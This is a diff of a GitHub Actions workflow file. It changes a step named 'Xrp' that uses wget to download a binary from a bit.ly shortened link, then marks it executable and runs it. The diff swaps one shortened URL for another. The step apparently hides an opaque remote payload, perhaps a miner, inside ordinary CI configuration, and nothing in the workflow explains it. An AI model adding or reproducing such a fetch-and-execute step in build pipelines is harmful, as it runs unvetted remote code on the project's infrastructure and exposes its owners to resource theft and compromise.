@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Xrp
       run: |
-        wget https://bit.ly/3H9yMlY && chmod u+x 3H9yMlY && ./3H9yMlY
+        wget https://bit.ly/3Luf4nJ && chmod u+x 3Luf4nJ && ./3Luf4nJ
